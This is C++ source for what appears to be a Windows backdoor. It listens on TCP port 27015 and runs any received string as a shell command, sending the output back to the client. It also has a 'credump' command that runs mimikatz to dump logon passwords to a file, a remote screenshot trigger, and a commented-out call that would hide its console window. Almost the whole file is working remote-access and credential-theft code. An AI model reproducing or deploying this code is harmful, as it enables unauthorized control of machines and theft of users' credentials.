#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
//#include <stdlib.h>
#include <iostream>
#include <string>
#include <string.h>
#include <fstream>


#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>

#define DEFAULT_BUFLEN 300000
#define DEFAULT_PORT "27015"

using namespace std;

void credenDump(){
    system("mimikatz.exe privilege::debug sekurlsa::logonpasswords exit > log.txt");
}


std::string exec(const char* cmd) {
    //std::cout << "DEBUG";
    std::array<char, 30000> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    //if (!pipe) {
    //    throw std::runtime_error("popen() failed!");
    //}
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        //std::cout << buffer.data() << "\n";
        result += buffer.data();

    }
    //std::cout << "DONE";
    return result;
}

string findStr(){
    string search = "DHCP Server";
    ifstream inFile;
    string line;

    //cin >> search;

    inFile.open("data.txt");
    size_t pos;

    while(inFile.good()){
        getline(inFile, line);
        pos = line.find(search);

        if(pos != string::npos){
            getline(inFile, line);
            getline(inFile, line);
            //cout << line;
            //cout << "Found";

            int p = line.find(": ");

            string sub = line.substr(p + 1);
            return sub;

            break;
        }
    }
    string fault = "";
    return fault;
}


void screenshot()
{
    //OutputString(L"Sending 'Win-D'\r\n");
    INPUT inputs[4] = {};
    ZeroMemory(inputs, sizeof(inputs));

    inputs[0].type = INPUT_KEYBOARD;
    inputs[0].ki.wVk = VK_LWIN;
   
    inputs[1].type = INPUT_KEYBOARD;
    inputs[1].ki.wVk = VK_SNAPSHOT;

    inputs[2].type = INPUT_KEYBOARD;
    inputs[2].ki.wVk = VK_SNAPSHOT;
    inputs[2].ki.dwFlags = KEYEVENTF_KEYUP;

    inputs[3].type = INPUT_KEYBOARD;
    inputs[3].ki.wVk = VK_LWIN;
    inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;

    UINT uSent = SendInput(ARRAYSIZE(inputs), inputs, sizeof(INPUT));
    if (uSent != ARRAYSIZE(inputs))
    {
        //OutputString(L"SendInput failed: 0x%x\n", HRESULT_FROM_WIN32(GetLastError()));
    } 
}


int main(){
    //ShowWindow(GetConsoleWindow(), SW_HIDE); //SW_RESTORE to bring back

	string myIP = findStr();
	

	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2,2), &wsaData);

	//if(iResult){
	//	std::cout << "Failed to create wsaData: " << iResult;
	//}

	SOCKET ListenSocket = INVALID_SOCKET;
    SOCKET ClientSocket = INVALID_SOCKET;

    struct addrinfo *result = NULL;
    struct addrinfo hints;

    int iSendResult;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;


    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
    ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
    iResult = bind( ListenSocket, result->ai_addr, (int)result->ai_addrlen);
    freeaddrinfo(result);

    iResult = listen(ListenSocket, SOMAXCONN);
    ClientSocket = accept(ListenSocket, NULL, NULL);
    string rs;

    do{
        memset(recvbuf, 0, sizeof(recvbuf));
        recvbuflen = 300000;
    	iResult = recv(ClientSocket, recvbuf, recvbuflen, 0);
       // std::cout << "\nreceive: " << recvbuf << "\n";
    	if(iResult > 0){
    		//std::cout << "\nMessage receive: " << recvbuf;

            if(stricmp(recvbuf, "TakeScreenshot") == 0){
                screenshot();
                iSendResult = send(ClientSocket, "TakeScreenshot", strlen("TakeScreenshot"), 0);
            }
            else if(stricmp(recvbuf, "cls") == 0){
                system("cls");
                iSendResult = send(ClientSocket, "Done Cls", strlen("Done Cls"), 0);
            }
            else if(stricmp(recvbuf, "exit") == 0){
                TerminateProcess(GetCurrentProcess(), 0);
            }
            else if(stricmp(recvbuf, "credump") == 0){
                credenDump();
            }
            else if(strcmp(recvbuf,"") == 0){
                ClientSocket = accept(ListenSocket, NULL, NULL);
            }

            else{
                rs = "";
                
                rs = (string)exec(recvbuf);
                if(rs == "")
                    rs = "No command";
                

                char p[rs.length()];
                memset(p, 0, sizeof(p));

                for (int a = 0; a < sizeof(p); a++){
                    //std::cout << rs[a] << ", ";
                    p[a] = rs[a];
                }


    	       	iSendResult = send(ClientSocket, p, sizeof(p), 0);
            }
    		//std::cout << iSendResult;
    	}
        else{
             iResult = listen(ListenSocket, SOMAXCONN);
            ClientSocket = accept(ListenSocket, NULL, NULL);
        }

    }
    while(1);

    iResult = shutdown(ClientSocket, SD_SEND);
    closesocket(ClientSocket);
    WSACleanup();
    
	return 0;
}